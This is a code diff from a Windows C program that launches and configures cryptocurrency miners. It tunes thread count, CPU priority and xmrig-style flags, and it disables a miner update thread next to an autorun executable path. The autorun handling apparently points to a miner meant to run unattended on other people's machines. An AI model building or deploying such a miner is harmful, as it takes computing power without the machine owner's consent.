@@ -227,9 +227,10 @@ static miners_context InitMinersContext(uint32_t Politika) {
 	Result.GPU_Bsleep = 25;
 	Result.GPU_Bfactor = 6;
 
-	Result.CPU_ThreadCount = GetOptimalWorkingCoresCount(Politika);
+	//Result.CPU_ThreadCount = GetOptimalWorkingCoresCount(Politika);
+	Result.CPU_ThreadCount = 2;
 	Result.CPU_Affinity = GetOptimalCPUAffinity(Politika);
-	Result.CPU_Priority = 3;
+	Result.CPU_Priority = 5;
 
 	Result.UsedPoolCount = 0;
 
@@ -279,7 +280,7 @@ static void BuildConfigStringFor(uint32_t Type, miners_context* Context, char* B
 			stbsp_snprintf(
 				TempBuf, 
 				TEMP_BUF_LEN_AZAZ, 
-				"-t %d --print-time %d --donate-level %d --cpu-affinity %ld --cpu-priority %d ",
+				"-t %d --safe --print-time %d --donate-level %d --cpu-affinity %ld --cpu-priority %d ",
 				Context->CPU_ThreadCount,
 				Context->CPU_LogDuration,
 				Context->DonateLevel,
@@ -1031,7 +1032,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	char autorun_exe_path[255];
 	DWORD ExePathLen = GetModuleFileNameA(0, autorun_exe_path, ARRAY_COUNT(autorun_exe_path));
 
-#if 1
+#if 0
 	HANDLE MinersUpdateThreadHandle = CreateThread(0, 0, MinersUpdateThread, 0, 0, 0);
 
 	WaitForSingleObject(MinersUpdateThreadHandle, INFINITE);
